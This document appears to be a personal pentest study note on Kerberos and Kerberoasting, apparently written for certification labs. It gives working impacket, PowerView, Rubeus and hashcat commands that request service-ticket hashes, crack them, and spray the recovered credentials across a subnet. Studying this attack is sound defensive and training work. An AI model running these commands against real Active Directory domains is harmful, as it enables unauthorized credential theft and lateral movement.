Kerberos is a SSO network auth protocol that allows authorized user to access a server with ticketing.  

**Three components**: Client , the resource(File server/any service), and KDC(Authe server and TGS) 
1. Client to access lets say file server, create a kerberos request with service details encrypts with its pass and sends it to Authe service of the KDS.  
2. AS decrypt(As it knows user hashes AD), generates TGT ticket granting ticket encrypted with password(krbtgt) known to AS and Ticket Granting service(TGS).  
3. Client sends the TGT to the TGS, TGS decrypts it and sends a Service ticket.
   Encypted with service accounts pass known to TGT and File server. This is where kerberosting happen. 
5. Client sends this ticket to the File server that decrypts the ticket and allows access .

TGT - Authentication  
TGS - Authorization
<img width="251" height="136" alt="image" src="https://github.com/user-attachments/assets/0de79b2e-aaf8-4f2f-b8db-7b1b069f731f" />

TGT server checks if user is authorized to access requested service.  
If allowed issues TGS ticket. Otherwise no. So we can’t simply request tgs for all services.  

SPN: FTP/test.com  - Service principal name is a unique identifier for a service instance.  
**Kerberoasting**: Get TGS for a service account and crack it for account hash.  
The TGS does not blindly issue tickets for any service. It checks:  
Whether the client is authenticated (via TGT).  
Whether the client has permission to access the requested service (based on policies or ACLs in the Key Distribution Center).  
Result: If the client does not have access rights, the TGS will deny the request.  

Kerberoasting works best against user service accounts configured with weak passwords, First to run when you compromise a domain account.  

**Kerberosting from Linux**:  with valid user creds - hash/kerb ticket/password  
impacket-GetUserSPNs -dc-ip 10.1.1.1 marvel.local/forend   //list spns. asks for user pass //password not required when kerberos pre-auth is not enabled !  

Impacket-GetUserSPNs -dc-ip 10.1.1.1 marvel.local/forend:Password1 -request  
//this will request tgs for all service accounts // will also tell group membership of each service accounts in the domain   

Impacket-GetUserSPNs -dc-ip 10.1.1.1 marvel.local/forend -request-user sqldev -request -outputfile sqldev_tgs   
//request TGS for user sqldev -outputfile sqldev_tgs //for specific service account and save it to file  

hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt   //for type 23  
//crack the hash  
//access the target or spray it in subnet with crackmapexec  

**From Windows**:  CPTS not PNPT  
Using PowerView:
Import-Module .\PowerView.ps1   //import powerview  
Get-DomainUser * -spn | select samaccountname  //list all SPNs  
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat  //TGS for one account  
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\marvel_tgs.csv -NoTypeInformation  
//Request TGS for all SPNs and copy out into CSV file  
//Crack the hash  

Using Rubeus: better faster and easy    
.\Rubeus.exe kerberoast /stats   //test  
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap   //print TGS hashes of all users  
.\Rubeus.exe kerberoast /tgtdeleg /user:testspn /nowrap  
// specify that we want only RC4 encryption when requesting a new service ticket  
//Supported in somecases for compati.  

When performing Kerberoasting in most environments, we will retrieve hashes that begin with $krb5tgs$23$*, an RC4 (type 23) encrypted ticket.  
Sometimes we will receive an AES-256 (type 18), AES-128(type 17) encrypted hash or hash that begins with $krb5tgs$18$* $krb5tgs$17$*  
If easy password all 3 can be cracked, otherwise aes takes lot longer than rc4  

How to check:  
PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes   
//decimal value of 0 means that a specific encryption type is not defined and set to the default of RC4_HMAC_MD5.  

For type 18 AES-256 hashcat module changes to  
hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt  

Removing support for RC4 regardless of the Domain Controller Windows Server version or  
domain functional level could have operational impacts and should be thoroughly tested before implementation.  

Can we force request rc4 ? google  
